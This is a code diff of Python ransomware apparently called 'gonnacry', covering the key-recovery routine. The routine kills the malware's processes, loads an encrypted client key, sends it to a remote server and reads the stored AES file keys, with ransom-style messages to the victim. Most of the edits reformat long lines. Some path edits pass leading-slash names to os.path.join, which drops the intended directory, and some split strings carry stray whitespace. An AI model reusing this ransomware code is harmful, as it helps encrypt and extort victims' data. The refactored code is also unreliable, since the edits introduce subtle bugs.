@@ -35,7 +35,9 @@ logo = """
 """
 
 
-BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
+BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', \
+                                                 '\33[93m', '\033[1;35m', '\033[1;32m', \
+                                                  '\033[0m'
 
 # enviroment paths
 ransomware_name = ("gonnacry")
@@ -48,12 +50,15 @@ machine_id = enviroment.get_unique_machine_id()
 
 
 def kill_daemon():
-    process = subprocess.Popen("pidof daemon", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    process = subprocess.Popen("pidof daemon", shell=True, stdout=subprocess.PIPE,
+                               stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     output = process.stdout.read() + process.stderr.read()
-    process2 = subprocess.Popen("pidof gonnacry", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    process2 = subprocess.Popen("pidof gonnacry", shell=True, stdout=subprocess.PIPE,
+                                stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     pid_of_gonnacry = process2.stdout.read() + process2.stderr.read()
     
-    process3 = subprocess.Popen("pidof python main.py", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    process3 = subprocess.Popen("pidof python main.py", shell=True, stdout=subprocess.PIPE,
+                                stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     pid_of_gonnacry2 = process3.stdout.read() + process3.stderr.read()
     try:
         pid_of_gonnacry2 = pid_of_gonnacry2.split(' ')[0]
@@ -115,10 +120,12 @@ def payment():
 def menu():
     print("{}Importing the encrypted client private key".format(WHITE))
     try:
-        with open(ransomware_path + '/encrypted_client_private_key.key', 'rb') as f:
+        with open(os.path.join(ransomware_path, '/encrypted_client_private_key.key'),
+                  'rb') as f:
             encrypted_client_private_key = pickle.load(f)
     except IOError:
-        print("encrypted client private key not found, I'm sorry. but all your files are lost!")
+        print("encrypted client private key not found, \
+              I'm sorry. but all your files are lost!")
         sys.exit(-1)
 
     print("{}OK{}".format(GREEN, WHITE))
@@ -132,17 +139,18 @@ def menu():
             client_private_key = send_to_server_encrypted_private_key(machine_id, key_to_be_sent)
             break
         except:
-            print("{}No connection, sleeping for 2 minutes\nConnect to internet to get your files back!{}".format(RED, WHITE))
+            print("{}No connection, sleeping for 2 minutes\nConnect \
+                  to internet to get your files back!{}".format(RED, WHITE))
             time.sleep(120)
 
     # saving to disk the private key
     print("{}Client private key decrypted and stored to disk{}".format(GREEN, WHITE))
-    with open(ransomware_path + "/client_private_key.PEM", 'wb') as f:
+    with open(os.path.join(ransomware_path, "/client_private_key.PEM"), 'wb') as f:
         f.write(client_private_key)
 
     # GET THE AES KEYS and path
     try:
-        with open(ransomware_path + "/AES_encrypted_keys.txt") as f:
+        with open(os.path.join(ransomware_path, "/AES_encrypted_keys.txt")) as f:
             content = f.read()
     except IOError:
         print("AES keys not found. Sorry but all your files are lost!")
